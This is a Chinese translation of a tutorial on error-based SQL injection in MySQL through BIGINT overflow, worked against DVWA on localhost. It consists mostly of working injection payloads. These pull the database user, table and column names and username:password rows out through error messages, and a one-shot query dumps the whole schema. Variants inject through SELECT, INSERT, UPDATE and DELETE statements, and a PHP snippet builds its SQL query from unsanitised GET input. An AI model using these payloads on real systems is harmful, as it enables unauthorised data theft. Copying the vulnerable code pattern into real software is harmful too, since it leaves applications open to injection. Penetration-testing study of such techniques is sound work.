# 基于BIGINT溢出错误的SQL注入

译者：mssp299

原文地址：[https://osandamalith.wordpress.com/2015/07/08/bigint-overflow-error-based-sql-injection/](https://osandamalith.wordpress.com/2015/07/08/bigint-overflow-error-based-sql-injection/)

0x01 概述
=======

* * *

我对于通过MySQL错误提取数据的新技术非常感兴趣，而本文中要介绍的就是这样一种技术。当我考察MySQL的整数处理方式的时候，突然对如何使其发生溢出产生了浓厚的兴趣。下面，我们来看看MySQL是如何存储整数的。

![enter image description here](http://drops.javaweb.org/uploads/images/3130ad6d13ef251288ee243b1ce6929f7b9fe66d.jpg)

(来源：[http://dev.mysql.com/doc/refman/5.5/en/integer-types.html](http://dev.mysql.com/doc/refman/5.5/en/integer-types.html))

只有5.5.5及其以上版本的MySQL才会产生溢出错误消息，之下的版本对于整数溢出不会发送任何消息。

数据类型BIGINT的长度为8字节，也就是说，长度为64比特。这种数据类型最大的有符号值，用二进制、十六进制和十进制的表示形式分别为“0b0111111111111111111111111111111111111111111111111111111111111111”、“0x7fffffffffffffff”和“9223372036854775807”。 当对这个值进行某些数值运算的时候，比如加法运算，就会引起“BIGINT value is out of range”错误。

```
mysql> select 9223372036854775807+1;
ERROR 1690 (22003): BIGINT value is out of range in '(9223372036854775807 + 1)'

```

为了避免出现上面这样的错误，我们只需将其转换为无符号整数即可。

对于无符号整数来说，BIGINT可以存放的最大值用二进制、十六进制和十进制表示的话，分别为“`0b1111111111111111111111111111111111111111111111111111111111111111`”、“`0xFFFFFFFFFFFFFFFF`”和“`18446744073709551615`”。

同样的，如果对这个值进行数值表达式运算，如加法或减法运算，同样也会导致“BIGINT value is out of range”错误。

```
# In decimal
mysql> select 18446744073709551615+1;
ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(18446744073709551615 + 1)'

# In binary
mysql> select cast(b'1111111111111111111111111111111111111111111111111111111111111111' as unsigned)+1;
ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(cast(0xffffffffffffffff as unsigned) + 1)'

# In hex
mysql> select cast(x'FFFFFFFFFFFFFFFF' as unsigned)+1;
ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(cast(0xffffffffffffffff as unsigned) + 1)'

```

如果我们对数值0逐位取反，结果会怎么样呢？ 当然是得到一个无符号的最大BIGINT值，这一点是显而易见的。

```
mysql> select ~0;
+----------------------+
| ~0 |
+----------------------+
| 18446744073709551615 |
+----------------------+
1 row in set (0.00 sec)

```

所以，如果我们对~0进行加减运算的话，也会导致BIGINT溢出错误。

```
mysql> select 1-~0;
ERROR 1690 (22003): BIGINT value is out of range in '(1 - ~(0))'
mysql> select 1+~0;
ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(1 + ~(0))'

```

0x002 注入技术
==========

* * *

我的想法是，利用子查询引起BITINT溢出，从而设法提取数据。我们知道，如果一个查询成功返回，其返回值为0，所以对其进行逻辑非的话就会变成1，举例来说，如果我们对类似(`select*from(select user())x`)这样的查询进行逻辑非的话，就会有：

```
mysql> select (select*from(select user())x);
+-------------------------------+
| (select*from(select user())x) |
+-------------------------------+
| root@localhost |
+-------------------------------+
1 row in set (0.00 sec)
# Applying logical negation
mysql> select !(select*from(select user())x);
+--------------------------------+
| !(select*from(select user())x) |
+--------------------------------+
| 1 |
+--------------------------------+
1 row in set (0.00 sec)

```

是的，太完美了！ 所以说，只要我们能够组合好逐位取反和逻辑取反运算，我们就能利用溢出错误来成功的注入查询。

```
mysql> select ~0+!(select*from(select user())x);
ERROR 1690 (22003): BIGINT value is out of range in '(~(0) + (not((select 'root@localhost' from dual))))'

```

我们先不使用加法，因为“+”通过网页浏览器进行解析的时候，会被转换为空白符（不过，你可以使用%2b来表示“+”）。 相反，我们可以使用减法。所以说，同一种注入攻击，可以有完全不同的变种。 最终的查询语句如下所示。

```
!(select*from(select user())x)-~0

(select(!x-~0)from(select(select user())x)a)

(select!x-~0.from(select(select user())x)a)

```

举例来说，我们可以像下面一样，在一个查询语句中进行注入操作。

```
mysql> select username, password from users where id='1' or !(select*from(select user())x)-~0;
ERROR 1690 (22003): BIGINT value is out of range in '((not((select 'root@localhost' from dual))) - ~(0))'

```

<http://localhost/dvwa/vulnerabilities/sqli/?id=1' or !(select*from(select user())x)-~0-- -|&Submit=Submit#>

![enter image description here](http://drops.javaweb.org/uploads/images/ee68e44ce6eb0ed46eda9aa9a7d1de45ce192e93.jpg)

利用这种基于BIGINT溢出错误的注入手法，我们可以几乎可以使用MySQL中所有的数学函数，因为它们也可以进行取反，具体用法如下所示：

```
select !atan((select*from(select user())a))-~0; 
select !ceil((select*from(select user())a))-~0;
select !floor((select*from(select user())a))-~0;

```

下面的我们已经测试过了，如果你愿意的话，还可以找到更多:)

```
HEX
IN
FLOOR
CEIL
RAND
CEILING
TRUNCATE
TAN
SQRT
ROUND
SIGN

```

0x003 提取数据
==========

* * *

提取数据的方法，跟其他注入攻击手法中的一样，这里只做简单介绍。

首先，我们来获取表名：

```
!(select*from(select table_name from information_schema.tables where table_schema=database() limit 0,1)x)-~0

```

取得列名：

```
select !(select*from(select column_name from information_schema.columns where table_name='users' limit 0,1)x)-~0;

```

检索数据：

```
!(select*from(select concat_ws(':',id, username, password) from users limit 0,1)x)-~0;

```

![enter image description here](http://drops.javaweb.org/uploads/images/d199fdfe6dbba7d7352e813eef4ed44bcebaba07.jpg)

0x004 一次性转储
===========

* * *

我们能够一次性转储所有数据库、列和数据表吗？ 答案是肯定的。但是，当我们从所有数据库中转储数据表和列的时候，只能得到较少的结果，毕竟我们是通过错误消息来检索数据的。 不过，如果我们是从当前数据库中转储数据的话，一次最多可以转储27个结果。下面举例说明。

```
!(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x)-~0
(select(!x-~0)from(select(concat (@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat (@,0xa,table_name,0x3a3a,column_name)),@))x)a)
(select!x-~0.from(select(concat (@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat (@,0xa,table_name,0x3a3a,column_name)),@))x)a)

```

![enter image description here](http://drops.javaweb.org/uploads/images/d240884f88f6930b7d006daa66b8bd0b650f402a.jpg)

这些限制了我们可以检索的结果的数量，即最多27个。假设，我们在一个数据库中创建了一个31列的数据表。 那么，我们只能看到27个结果，而我的其他4个表和该用户数据表的其他列都无法返回。

![enter image description here](http://drops.javaweb.org/uploads/images/50fa947f403f0144de73c43d1d6354401cc23648.jpg)

0x05 利用插入语句进行注入
===============

* * *

利用插入语句，我们也可以进行类似的注入攻击，具体语法为`‘’ or (payload) or “”`。

```
mysql> insert into users (id, username, password) values (2, '' or !(select*from(select user())x)-~0 or '', 'Eyre');
ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not((select 'root@localhost' from dual))) - ~(0))'

```

我们还可以使用DIOS查询。

```
insert into users (id, username, password) values (2, '' or !(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x)-~0 or '', 'Eyre');
ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not((select '000
newdb::users::id
newdb::users::username
newdb::users::password' from dual))) - ~(0))'

```

![enter image description here](http://drops.javaweb.org/uploads/images/01c8ea230aa57d0b7c177e29884296437dd5a543.jpg)

0x06 利用更新语句进行注入
===============

* * *

利用更新语句，我们照样可以进行类似的注入，具体如下所示：

```
mysql> update users set password='Peter' or !(select*from(select user())x)-~0 or '' where id=4;
ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not((select 'root@localhost' from dual))) - ~(0))'

```

0x07 利用更新语句进行注入
===============

* * *

同样的，我们也可以利用删除语句进行注入，具体如下所示：

```
mysql> delete from users where id='1' or !(select*from(select user())x)-~0 or '';
ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not((select 'root@localhost' from dual))) - ~(0))'

```

0x08 小结
=======

* * *

本文的攻击之所以得逞，是因为`mysql_error()`会向我们返回错误消息，只要这样，我们才能够利用它来进行注入。 这一功能，是在5.5.5及其以上版本提供的。对于这些溢出攻击，还有许多不同的形式。 例如：

```
mysql> select !1-0^222;
ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not(1)) - (0 ^ 222))'
mysql> select !(select*from(select user())a)-0^222;
ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not((select 'root@localhost' from dual))) - (0 ^ 222))'

```

此外，后端代码中的引用、双引号或括号问题，也会引起注入攻击。举例来说，如果利用DVWA修改PHP代码去掉引号， 无需前面类似的或操作就能进行注入了。

```
<?php   

if(isset($_GET['Submit'])){

    // Retrieve data

    $id = $_GET['id'];

    $getid = "SELECT first_name, last_name FROM users WHERE user_id = $id";
    $result = mysql_query($getid) or die('<pre>' . mysql_error() . '</pre>' );

    $num = mysql_numrows($result);

    $i = 0;

    while ($i < $num) {

        $first = mysql_result($result,$i,"first_name");
        $last = mysql_result($result,$i,"last_name");

        $html .= '<pre>';
        $html .= 'ID: ' . $id . '<br>First name: ' . $first . '<br>Surname: ' . $last;
        $html .= '</pre>';

        $i++;
    }
}
?>

```

<http://localhost/dvwa/vulnerabilities/sqli/?id=!(select*from(select user())a)-0^222 &Submit=Submit#>

![enter image description here](http://drops.javaweb.org/uploads/images/929cf770fcebda8ea737c24b9571e5da314e2347.jpg)

我希望本文对大家的渗透测试工作能够有所帮助。

0x09 参考资料
=========

* * *

[1](http://drops.wooyun.org/wp-content/uploads/2015/08/116.png)[http://dev.mysql.com/doc/refman/5.5/en/integer-types.html](http://dev.mysql.com/doc/refman/5.5/en/integer-types.html)

[2](http://drops.wooyun.org/wp-content/uploads/2015/08/217.png)[https://dev.mysql.com/doc/refman/5.0/en/numeric-type-overview.html](https://dev.mysql.com/doc/refman/5.0/en/numeric-type-overview.html)

[3](http://drops.wooyun.org/wp-content/uploads/2015/08/314.png)[https://dev.mysql.com/doc/refman/5.0/en/mathematical-functions.html](https://dev.mysql.com/doc/refman/5.0/en/mathematical-functions.html)